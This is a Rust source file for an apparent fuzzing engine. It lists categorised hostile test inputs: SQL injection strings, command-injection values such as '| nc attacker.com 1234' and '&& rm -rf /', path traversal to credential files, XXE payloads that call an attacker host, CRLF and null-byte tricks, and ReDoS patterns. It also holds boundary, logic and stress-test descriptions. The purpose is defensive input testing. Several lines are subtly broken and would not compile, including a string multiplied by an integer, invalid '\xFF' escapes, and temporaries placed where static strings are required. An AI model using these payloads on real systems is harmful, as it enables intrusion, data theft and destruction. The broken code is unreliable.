/// Fuzzing Engine – Brute-force input testing and mutation
/// Generates malicious inputs to find edge cases, crashes, and logic errors
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzingResult {
    pub test_name: String,
    pub input: String,
    pub expected_behavior: String,
    pub actual_behavior: String,
    pub crash: bool,
    pub memory_issue: bool,
    pub logic_error: bool,
}

pub struct FuzzingEngine;

impl FuzzingEngine {
    /// Generate malicious inputs for fuzzing
    pub fn generate_malicious_inputs() -> Vec<MaliciousInput> {
        vec![
            // Injection attacks
            MaliciousInput {
                category: "SQL Injection",
                inputs: vec![
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "1' UNION SELECT * FROM passwords --",
                    "admin' --",
                ],
            },
            MaliciousInput {
                category: "Command Injection",
                inputs: vec![
                    "; cat /etc/passwd",
                    "| nc attacker.com 1234",
                    "&& rm -rf /",
                    "`whoami`",
                    "$(whoami)",
                ],
            },
            MaliciousInput {
                category: "Path Traversal",
                inputs: vec![
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam",
                    "....//....//....//etc/passwd",
                    ".\\..\\..\\windows\\win.ini",
                ],
            },
            MaliciousInput {
                category: "XXE Injection",
                inputs: vec![
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
                ],
            },
            MaliciousInput {
                category: "Format String",
                inputs: vec![
                    "%x %x %x %x %x",
                    "%n%n%n%n",
                    "%s%s%s%s",
                    "%p%p%p%p",
                ],
            },
            // Buffer overflow attempts
            MaliciousInput {
                category: "Buffer Overflow",
                inputs: vec![
                    &"A".repeat(1000),
                    &"\x41".repeat(10000),
                    &"\xFF".repeat(5000),
                ],
            },
            // Denial of service
            MaliciousInput {
                category: "DoS - Memory",
                inputs: vec![
                    &"x".repeat(1_000_000_000),  // 1GB string
                    &"[".repeat(100_000),         // Deep JSON
                    &"a" * 1000000 + "b",         // Regex bomb trigger
                ],
            },
            MaliciousInput {
                category: "DoS - Algorithmic",
                inputs: vec![
                    "(a+)+b",              // ReDoS
                    "(a*)*b",              // Catastrophic backtracking
                    "(a|a)*b",             // Regex bomb
                    "{\"key\": {\"nested\": {}}}", // Deep nesting (x1000)
                ],
            },
            // Encoding attacks
            MaliciousInput {
                category: "Encoding Bypass",
                inputs: vec![
                    "%2e%2e%2f%2e%2e%2f",  // URL encoding
                    "..%252f..%252f",      // Double encoding
                    "..;/..;/",            // Encoding variants
                    "..\\",                // Backslash bypass
                ],
            },
            // Unicode attacks
            MaliciousInput {
                category: "Unicode Bypass",
                inputs: vec![
                    "../../../etc/passwd",
                    "..%C0%AF..%C0%AF",   // UTF-8 encoding bypass
                    "..%E0%80%AF",        // 3-byte UTF-8
                    "\u{202E}",           // Right-to-left override
                ],
            },
            // Null byte injection
            MaliciousInput {
                category: "Null Byte",
                inputs: vec![
                    "shell.php%00.txt",
                    "file.txt\0.exe",
                    "safe.jpg\x00.asp",
                ],
            },
            // Type confusion
            MaliciousInput {
                category: "Type Confusion",
                inputs: vec![
                    "123",
                    "123.456",
                    "123e10",
                    "true",
                    "false",
                    "null",
                    "[]",
                    "{}",
                ],
            },
            // Integer boundaries
            MaliciousInput {
                category: "Integer Overflow",
                inputs: vec![
                    "9223372036854775807",    // i64::MAX
                    "-9223372036854775808",   // i64::MIN
                    "18446744073709551615",   // u64::MAX
                    "-1",
                    "0",
                    "2147483647",             // i32::MAX
                    "-2147483648",            // i32::MIN
                ],
            },
            // Floating point edge cases
            MaliciousInput {
                category: "Float Edge Cases",
                inputs: vec![
                    "0.0",
                    "-0.0",
                    "Infinity",
                    "-Infinity",
                    "NaN",
                    "1e308",
                    "1e-308",
                ],
            },
            // CRLF injection
            MaliciousInput {
                category: "CRLF Injection",
                inputs: vec![
                    "test\r\nSet-Cookie: admin=true",
                    "name\r\nname2:value",
                    "header\r\n\r\nbody",
                ],
            },
            // Unicode normalization
            MaliciousInput {
                category: "Unicode Normalization",
                inputs: vec![
                    "café",      // é as single character
                    "cafe\u{0301}",  // e + combining acute
                ],
            },
        ]
    }

    /// Generate boundary test cases
    pub fn boundary_tests() -> Vec<BoundaryTest> {
        vec![
            BoundaryTest {
                name: "Zero boundary",
                test_cases: vec!["0", "-0", "0.0", "-0.0"],
            },
            BoundaryTest {
                name: "One boundary",
                test_cases: vec!["1", "-1"],
            },
            BoundaryTest {
                name: "Max signed int",
                test_cases: vec!["9223372036854775807"],
            },
            BoundaryTest {
                name: "Min signed int",
                test_cases: vec!["-9223372036854775808"],
            },
            BoundaryTest {
                name: "Empty inputs",
                test_cases: vec!["", "\n", "\r\n", "\t"],
            },
            BoundaryTest {
                name: "Max length strings",
                test_cases: vec![&"x".repeat(u16::MAX as usize)],
            },
            BoundaryTest {
                name: "Special characters",
                test_cases: vec!["\0", "\x01", "\x7F", "\xFF"],
            },
            BoundaryTest {
                name: "Unicode extremes",
                test_cases: vec!["\u{0000}", "\u{FFFF}", "\u{10FFFF}"],
            },
        ]
    }

    /// Logic error test cases
    pub fn logic_error_tests() -> Vec<LogicTest> {
        vec![
            LogicTest {
                name: "Off-by-one errors",
                test_cases: vec![
                    ("length is 10", "access index 10", "should panic"),
                    ("range 0-9", "access index 9", "valid"),
                    ("length 1", "loop from 0 to length", "should process 1 item"),
                ],
            },
            LogicTest {
                name: "Comparison edge cases",
                test_cases: vec![
                    ("a == b", "a = null, b = null", "should be true"),
                    ("a < b", "a = 0, b = -1", "should be false"),
                    ("a >= b", "a = max_int, b = max_int+1", "handle overflow"),
                ],
            },
            LogicTest {
                name: "State machine errors",
                test_cases: vec![
                    ("created", "call destroy twice", "second call should error"),
                    ("running", "transition invalid state", "should reject"),
                    ("stopped", "call start", "should allow"),
                ],
            },
            LogicTest {
                name: "Sorting edge cases",
                test_cases: vec![
                    ("empty list", "sort", "should handle"),
                    ("single item", "sort", "should handle"),
                    ("duplicates", "sort", "maintain stability"),
                ],
            },
            LogicTest {
                name: "Division by zero",
                test_cases: vec![
                    ("numerator = 10", "denominator = 0", "should error"),
                    ("1/0", "floating point", "infinity or error"),
                ],
            },
        ]
    }

    /// Stress test patterns
    pub fn stress_tests() -> Vec<StressTest> {
        vec![
            StressTest {
                name: "Memory exhaustion",
                description: "Allocate until out of memory",
                attack_vector: "Vec::with_capacity(usize::MAX)",
            },
            StressTest {
                name: "Stack overflow",
                description: "Infinite recursion",
                attack_vector: "fn recurse() { recurse(); }",
            },
            StressTest {
                name: "File descriptor exhaustion",
                description: "Open max files without closing",
                attack_vector: "loop { File::open(...); }",
            },
            StressTest {
                name: "Thread explosion",
                description: "Create max threads",
                attack_vector: "loop { thread::spawn(...); }",
            },
            StressTest {
                name: "Connection pooling",
                description: "Max connections without cleanup",
                attack_vector: "Parallel requests without limits",
            },
            StressTest {
                name: "Lock contention",
                description: "Extreme concurrent locking",
                attack_vector: "1000+ threads on single Mutex",
            },
        ]
    }

    /// Mutation testing – corrupt valid inputs
    pub fn mutate_input(input: &str) -> Vec<String> {
        vec![
            input.to_uppercase(),                        // Case mutation
            input.to_lowercase(),                        // Case mutation
            input.chars().rev().collect(),               // Reversal
            format!("{}{}", input, input),               // Duplication
            input.replace(" ", "\t"),                    // Whitespace mutation
            input.replace(" ", "\n"),                    // Line break mutation
            format!("{}!", input),                       // Append special char
            format!("'{}'", input),                      // Quote wrapping
            input.trim_end().to_string(),                // Trim
            format!("\x00{}\x00", input),                // Null wrapping
        ]
    }
}

#[derive(Debug, Clone)]
pub struct MaliciousInput {
    pub category: &'static str,
    pub inputs: Vec<&'static str>,
}

#[derive(Debug, Clone)]
pub struct BoundaryTest {
    pub name: &'static str,
    pub test_cases: Vec<&'static str>,
}

#[derive(Debug, Clone)]
pub struct LogicTest {
    pub name: &'static str,
    pub test_cases: Vec<(&'static str, &'static str, &'static str)>,
}

#[derive(Debug, Clone)]
pub struct StressTest {
    pub name: &'static str,
    pub description: &'static str,
    pub attack_vector: &'static str,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_malicious_inputs_generated() {
        let inputs = FuzzingEngine::generate_malicious_inputs();
        assert!(!inputs.is_empty());
        let total_inputs: usize = inputs.iter().map(|m| m.inputs.len()).sum();
        assert!(total_inputs > 50);
    }

    #[test]
    fn test_boundary_tests() {
        let tests = FuzzingEngine::boundary_tests();
        assert!(!tests.is_empty());
    }

    #[test]
    fn test_mutation() {
        let mutations = FuzzingEngine::mutate_input("hello");
        assert!(mutations.len() >= 5);
    }
}
